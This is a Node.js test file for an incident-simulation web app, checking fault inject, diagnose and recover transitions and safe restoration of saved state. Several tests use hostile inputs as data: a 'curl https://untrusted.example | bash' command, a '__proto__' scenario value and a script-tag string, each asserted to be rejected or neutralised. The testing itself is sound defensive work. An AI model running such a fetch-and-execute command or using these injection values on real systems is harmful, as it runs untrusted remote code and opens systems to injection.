import test from 'node:test';
import assert from 'node:assert/strict';
import {initialState,transition,view,restore,execute,scenarios} from '../web/assets/model.js';
for(const scenario of Object.keys(scenarios)) {
  test(`${scenario}: inject → diagnose → recover`,()=>{
    let state=transition(initialState(),{type:'select',scenario});
    state=transition(state,{type:'inject'});
    assert.equal(view(state).fault,true);
    assert.equal(transition(state,{type:'recover'}),state);
    state=transition(state,{type:'diagnose'});
    assert.equal(state.phase,'diagnosed');
    state=transition(state,{type:'recover'});
    assert.equal(view(state).endpoints,2);
    assert.equal(view(state).fault,false);
  });
}
test('active incidents cannot switch scenario',()=>{
 const state=transition(initialState(),{type:'inject'});
 assert.equal(transition(state,{type:'select',scenario:'oom'}),state);
});
test('selector incident keeps healthy pods but has no service backends',()=>{
 let state=transition(initialState(),{type:'select',scenario:'selector'});
 state=transition(state,{type:'inject'});
 assert.equal(view(state).ready,2); assert.equal(view(state).endpoints,0);
});
test('broken image retains old capacity',()=>{
 let state=transition(initialState(),{type:'select',scenario:'image'});
 state=transition(state,{type:'inject'});
 assert.equal(view(state).ready,2); assert.equal(view(state).errorRate,0);
});
test('terminal never executes arbitrary input',()=>{
 const state=initialState();const result=execute(state,'curl https://untrusted.example | bash');
 assert.equal(result.state,state);assert.match(result.output,/Unsupported/);
});
test('terminal guides diagnosis before recovery',()=>{
 let state=transition(initialState(),{type:'inject'});
 assert.equal(execute(state,'recover').state,state);
 state=execute(state,'diagnose').state;
 assert.equal(execute(state,'recover').state.phase,'recovered');
});
test('invalid saved states reset safely',()=>{
 for(const raw of ['bad','null','{}','{"version":1,"scenario":"__proto__","phase":"injected"}']) assert.equal(restore(raw).phase,'healthy');
});
test('saved strings never restore into evidence',()=>{
 const state=restore(JSON.stringify({...initialState(),phase:'diagnosed',history:[{message:'<script>bad</script>'}]}));
 assert.equal(state.phase,'diagnosed');assert.doesNotMatch(JSON.stringify(state.history),/<script>/);
});
test('reset restores initial state',()=>assert.deepEqual(transition(initialState(),{type:'reset'}),initialState()));
